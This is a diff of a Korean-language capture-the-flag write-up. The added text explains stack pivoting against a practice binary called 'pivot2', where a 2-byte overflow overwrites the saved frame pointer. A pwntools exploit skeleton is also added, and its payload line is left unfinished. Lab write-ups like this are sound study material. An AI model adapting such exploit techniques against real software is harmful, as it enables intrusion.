@@ -81,7 +81,7 @@ p.interactive()
 
 ## 2 Pivot2
 
-Stack Pivoting을 이용하여 
+2byte밖에 bof가 일어나지 않지만 Stack Pivoting을 이용하여 SFP를 덮을 수 있다. 그 이유는 SFP의 주소가 buf주소와 1.5byte 정도 차이가 나기 때문이다. SFP의 끝 2bytes를 덮어주면 원하는 주소로 이동?
 
 
 ```python
@@ -91,9 +91,18 @@ p = process('./pivot2')
 e = ELF('./pivot2')
 libc = e.libc
 
-
 bss = e.bss() + 0x400
 
+
+buf_addr = int(p.recv(14), 16)
+
+payload = b'A'*0x100
+payload += p64(buf_addr)
+payload +=
+
+
+
+p.send(payload)
 
 
 
@@ -103,6 +112,10 @@ p.interactive()
 ```
 
 
-
-
 ## 3 rop_master
+
+
+
+
+
+
